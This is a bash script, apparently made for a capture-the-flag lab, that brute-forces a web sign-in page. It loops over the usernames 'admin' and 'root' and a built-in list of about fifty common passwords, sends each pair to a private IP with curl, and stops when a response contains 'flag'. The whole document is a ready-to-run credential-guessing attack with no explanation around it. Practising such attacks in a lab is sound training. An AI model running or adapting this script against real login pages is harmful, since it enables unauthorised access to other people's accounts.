#!/bin/bash

usernames=(admin root) #we can retrive a list of most used usernames too
passwords=(123456 password 123456789 12345678 12345 1234567 admin 123123 qwerty abc123 letmein monkey 111111 password1 qwerty123 dragon 1234 baseball iloveyou trustno1 sunshine princess football welcome shadow superman michael ninja mustang jessica charlie ashley bailey passw0rd master love hello freedom whatever nicole jordan cameron secret summer 1q2w3e4r zxcvbnm starwars computer taylor startrek)

for username in "${usernames[@]}"; do
	for password in "${passwords[@]}"; do
        echo "Trying username '${username}' and password '${password}'..."

        output=$(curl -s -X POST "http://10.14.60.12/index.php?page=signin&username=${username}&password=${password}&Login=Login#" | grep 'flag')
        
        if [[ -n $output ]]; then
            echo "Flag found: ${output}"
            exit 0
        fi
    done
done

echo "No flag found with given username/password combinations."